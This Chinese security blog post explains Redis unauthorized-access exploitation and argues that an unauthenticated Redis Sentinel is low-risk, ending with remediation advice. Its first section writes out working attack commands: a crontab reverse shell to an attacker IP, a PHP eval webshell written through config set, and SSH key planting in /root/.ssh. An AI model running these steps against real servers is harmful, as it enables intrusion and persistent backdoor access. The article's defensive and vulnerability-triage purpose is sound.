## 前言

最近公司的攻防演练中，看到了乙方安全公司提交的报告里有高危漏洞redis未授权访问。事实上对方并没有利用该漏洞获取任何权限或者信息，就贸然报为高危显然是不合适的。究其原因是发现漏洞的机器是公司的redis哨兵。接下来本文浅谈redis中哨兵机制下的未授权访问漏洞。

## 一般情况下的redis未授权访问利用

![](https://image.3001.net/images/20210813/1628821601_6115d861b08ac6c597462.png!small)

显示连接成功，一般测试人员就会认为存在未授权访问漏洞，但其实这个漏洞还并没有任何价值，接下来看具体的利用

1）查看敏感信息

redis 192.168.242.134:6379> info

![](https://image.3001.net/images/20210813/1628821628_6115d87c760fe10e1cbd4.png!small)

2）查看key和对应的值

> >>>keys *

![](https://image.3001.net/images/20210813/1628821654_6115d896149d92d5bab6f.png!small)

到此为止就是收集信息，以求扩大战果

当然你也可以考虑直接拿机器权限：

> 1.利用crontab反弹shell
>
> >>直接向靶机的Crontab写入任务计划，反弹shell回来
>
> redis 192.168.242.134:6379> set x "\n* * * * * bash -i >&
> /dev/tcp/192.168.242.131/888 0>&1\n"
>
> redis 192.168.242.134:6379> config set dir /var/spool/cron/
>
> redis 192.168.242.134:6379> config set dbfilename root
>
> redis 192.168.242.134:6379> save

![](https://image.3001.net/images/20210813/1628821676_6115d8ac5fe739dc10624.png!small)

>>然后在攻击机（192.168.242.131）上启动 nc 监听 888端口，等待反弹shell。这过程需要一些时间。

[root@localhost ~]# nc -lvnp 888

![](https://image.3001.net/images/20210813/1628821695_6115d8bfd5017c73951b1.png!small)

2.写入webshell

当自己的redis权限不高时，可以向web里写入webshell，但需要对方有web服务且有写入权限。假设靶机里面存在WEB服务并且目录在
/var/www/

> redis 192.168.242.134:6379>config set dir /var/www/a
>
> redis 192.168.242.134:6379>config set xxx "\n\n\n<?php
> @eval($_POST['c']);?>\n\n\n"
>
> redis 192.168.242.134:6379>config set dbfilename webshell.php
>
> redis 192.168.242.134:6379>save

写入之后访问目录看是否存在，如果已经写入，可以使用菜刀连入数据库了。

3.写ssh-keygen公钥然后使用私钥登陆

>>利用条件：(1)redis对外开放，且是未授权访问状态

(2)redis服务ssh对外开放，可以通过key登入

>>具体利用步骤：

1) 准备好自己的公钥，写入本地文件text.txt。

> [root@localhost src]#ssh-keygen -t rsa # 创建秘钥
>
> [root@localhost src]#(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") >
> test.txt

2) 通过redis将该文件写入内存

> [root@localhost src]# ./redis-cli -h 192.168.242.134 flushall
>
> [root@localhost src]# cat test.txt | redis-cli -h 192.168.242.134 -x set
> crackit #链接redis 并将秘钥上传

3) 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下

> [root@localhost src]# redis-cli -h 192.168.242.134
>
> 192.168.242.134:6379> config set dir /root/.ssh/# 切到ssh目录去
>
> 192.168.242.134:6379> config get dir
>
> 192.168.242.134:6379> config set dbfilename "authorized_keys"# 保存到
> authorized_keys 文件里
>
> 192.168.242.134:6379> save ssh -i id_rsa root@192.168.242.134# 保存并登陆

以上就是redis未授权访问漏洞的基本利用方式，至少需要拿权限或者数据，才有被定义为高危漏洞的意义。接下来看启用了哨兵模式的redis

## 哨兵模式下的redis未授权访问

首先简单介绍下redis哨兵模式，需要了解的有：

Redis 哨兵模式（Sentinel）就是一个自动地监控处理 redis 间故障节点转移工作的一个「东西」，准确来说，Sentinel 其实是一个
redis 服务端程序，只不过运行在特殊的模式下， **不提供数据存储服务** ，只进行普通 redis 节点监控管理。

Sentinel 其实也是一个 redis 的服务端程序，它也会定时执行 serverCron 函数，只是里面其他的程序用不到，用到的是对普通 redis
节点的监控以及故障转移模块。

Sentinel 初始化的时候会清空原来的命令表，写入自己独有的命令进去，所以普通 redis 节点支持的数据读写命令，对 Sentinel
**来说都是找不到命令，** 因为它根本就没有初始化这些命令的执行器。

Sentinel 会定时的对自己监控的 master 执行 info 命令，获取最新的主从关系，还会定时的给所有的 redis 节点发送 ping
心跳检测命令，如果检测到某个 master 无法响应了，就会在给其他 Sentinel 发送消息，主观认为该 master 宕机，如果 Sentinel
集群认同该 master 下线的人数达到一个值，那么大家统一意见，下线该 master。

接下来看实战，

1.未授权访问redis的第一种情况：

![](https://image.3001.net/images/20210813/1628821911_6115d9979fd5211727b81.png!small)

连进来了，但并没有完全连进来。执行任何命令均提示NOAUTH Authentication required。即权限不足。

看配置文件，此处关于鉴权有两种写法,第一种

![](https://image.3001.net/images/20210813/1628821941_6115d9b5448a43d681437.png!small)

requirepass "password"

第二种：

![](https://image.3001.net/images/20210813/1628821965_6115d9cd91830f31d6f09.png!small)

sentinel auth-pass <master-name> <password>

在这种情况下连接redis所谓未授权漏洞，其实是没有任何意义的

2.未授权访问redis的第二种情况

![](https://image.3001.net/images/20210813/1628821995_6115d9ebaf24adc2e03ab.png!small)

连进来了，可以看info，但是

![](https://image.3001.net/images/20210813/1628822015_6115d9ff376ce6c363879.png!small)

你执行任何命令都会提示ERR unknown command 'keys'。回到本节开头，关于哨兵你需要了解的：

Sentinel 初始化的时候会清空原来的命令表，写入自己独有的命令进去，所以普通 redis 节点支持的数据读写命令，对 Sentinel 来说都是
**找不到命令** ，因为它根本就没有初始化这些命令的执行器。

那么这种情况下的配置文件里是没有写鉴权的，也即

![](https://image.3001.net/images/20210813/1628822040_6115da18831a89f5fcd5f.png!small)

并没有前文提到的两种鉴权的两种方式，没有设置密码

这种情况下的未授权访问的确可以说是一个漏洞，但危害极为有限，仅是一些不重要的信息泄露，除非能从泄露的信息组合其它漏洞利用，不然也可以说是个没卵用的漏洞

最后就是有同学可能会问，那么如果我知道了redis哨兵的密码呢？实战请看：

![](https://image.3001.net/images/20210813/1628822063_6115da2f45752644febc4.png!small)

带-a指定密码，查看哨兵数据库为空。回到本节开头，关于哨兵你需要了解的：

Redis 哨兵模式（Sentinel）就是一个自动地监控处理 redis 间故障节点转移工作的一个「东西」，准确来说，Sentinel 其实是一个
redis 服务端程序，只不过运行在特殊的模式下， **不提供数据存储服务** ，只进行普通 redis 节点监控管理。

## 防御和修复

最后是总结redis未授权访问的漏洞修复方式，网上可以查到一些古怪的说法，包括但不限于：

禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的"#bind 127.0.0.1"
，去掉前面的"#"即可（Redis本来就是作为内存数据库，只要监听在本机即可）；（显然这是一种鸵鸟心态，我们无法默认内网是安全的，即使在内网也要注意漏洞的修复和防御，特别是在目前大的网络安全环境下，内网安全问题日趋严重）

修改Redis默认端口，将默认的6379端口修改为其他端口（鸵鸟心态*2）

禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项"RENAME_CONFIG"，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度（鸵鸟心态*3）

Redis使用普通用户权限，禁止使用 root 权限启动Redis
服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限（鸵鸟心态*4）

就我个人的看法，修复的要务有二：

对redis本身设置密码访问认证，可通过修改redis.conf配置文件中的"requirepass" 设置复杂密码
（需要重启Redis服务才能生效，同时建议通过脚本或其它方式定期自动更换密码，关于如何生成随机强密码本文不做展开）

对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器，引申开去包括网络隔离，零信任等

## 后记

从这次漏洞的误报中也启发我的一点思考，

一是：

对于漏洞的检测需要有一种务实的态度，尽可能找到利用的最大化方式，以及漏洞定级的严肃性，尽量深入了解漏洞原理，而不是抱着完成任务的心态随便扫一扫，跑脚本就出报告。以至于频发误报，是一种职业态度的自我要求。

二是：

对于redis未授权访问漏洞的利用方式，不能简单判断为可以直连6379就算验证了漏洞；在安全设备（扫描器）或者其它脚本中需要对这一点做出改进，以降低误报率，推广到同样存在各种误报的某厂漏扫，需要如何做好检测，以及如何做好漏洞管理？有机会下一篇文章再展开讲。

